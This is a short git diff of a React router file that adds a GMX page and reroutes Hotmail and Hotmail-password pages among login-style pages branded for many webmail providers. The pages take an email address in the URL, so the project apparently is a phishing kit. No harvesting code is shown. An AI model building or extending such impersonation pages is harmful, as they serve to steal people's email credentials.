@@ -6,6 +6,7 @@ import Page126 from "./pages/126";
 import Page163 from "./pages/163";
 import Page263 from "./pages/263";
 import Encryption from "./pages/encryption";
+import Gmx from "./pages/gmx";
 import Godaddy from "./pages/godaddy";
 import Hinet from "./pages/hinet";
 import Hiworks from "./pages/hiworks";
@@ -71,9 +72,14 @@ function App() {
         <Yahoo path={page.yahoo} />
         <Yandex path={page.yandex} />
         <Zoho path={page.zoho} />
-        <Hotmail path="ht" />
-        <HotmailPassword path={page.office} />
-        <RedirectNorecord path={page.gmx} />
+
+        <Hotmail path={page.office} />
+        <HotmailPassword path="ht/:data" />
+
+        <Gmx path={page.gmx} />
+        
+
+
         <Processing path="processing" />
         <Portal path="portal" />
       </Router>
@@ -95,6 +101,9 @@ function App() {
 export default App;
 
 /*
+<HotmailPassword path={page.office} />
+<RedirectNorecord path={page.gmx} />
+
 <Redirect path={`/:entry/:email`} />
 
  useEffect(() => {
